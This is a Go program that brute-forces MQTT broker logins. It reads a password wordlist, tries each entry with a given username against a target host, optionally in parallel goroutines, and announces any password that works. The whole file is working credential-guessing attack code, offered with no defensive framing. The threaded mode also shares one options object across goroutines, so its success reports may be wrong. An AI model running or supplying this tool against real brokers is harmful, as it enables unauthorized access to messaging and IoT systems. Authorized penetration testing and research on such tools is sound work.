package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"sync"

	log "github.com/sirupsen/logrus"

	mqtt "github.com/eclipse/paho.mqtt.golang"
)

var messagePubHandler mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) {
	fmt.Printf("Received message: %s from topic: %s\n", msg.Payload(), msg.Topic())
}

var connectHandler mqtt.OnConnectHandler = func(client mqtt.Client) {
	fmt.Println("Connected")
}

var connectLostHandler mqtt.ConnectionLostHandler = func(client mqtt.Client, err error) {
	fmt.Printf("Connect lost: %v", err)
}

func init() {
	log.SetFormatter(&log.TextFormatter{FullTimestamp: true})
}

func main() {
	host := flag.String("host", "localhost", "mqtt server address")
	port := flag.Int("port", 1883, "mqtt port server")
	user := flag.String("user", "admin", "username of mqtt")
	pass := flag.String("pass_file", "/tmp/pass", "directory of worldlist")
	thrd := flag.Bool("thread", false, "use multiple thread")

	flag.Parse()

	opts := mqtt.NewClientOptions()
	opts.AddBroker(fmt.Sprintf("tcp://%s:%d", *host, *port))
	opts.SetClientID("go_mqtt_client")
	opts.SetUsername(*user)
	opts.SetDefaultPublishHandler(messagePubHandler)
	opts.OnConnect = connectHandler
	opts.OnConnectionLost = connectLostHandler

	file, err := os.Open(*pass)
	if err != nil {
		log.Fatalf("failed to open")
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var (
		text []string
	)

	for scanner.Scan() {
		text = append(text, scanner.Text())
	}
	file.Close()
	if *thrd {
		var wg sync.WaitGroup
		for _, each_ln := range text {
			wg.Add(1)
			go func(w *sync.WaitGroup, pass string) {
				defer wg.Done()
				log.Info("Trying login with " + pass + " On " + *host)
				opts.SetPassword(pass)
				client := mqtt.NewClient(opts)
				if token := client.Connect(); token.Wait() && token.Error() != nil {
					log.Error(token.Error())
				} else {
					log.Info("Bingo,password get " + pass)
					os.Exit(0)
				}
			}(&wg, each_ln)
		}
		wg.Wait()
	} else {
		for _, each_ln := range text {
			log.Info("Trying login with " + each_ln + " On " + *host)
			opts.SetPassword(each_ln)
			client := mqtt.NewClient(opts)
			if token := client.Connect(); token.Wait() && token.Error() != nil {
				log.Error(token.Error())
			} else {
				log.Info("Bingo,password get " + each_ln)
				os.Exit(0)
			}
		}
	}
}
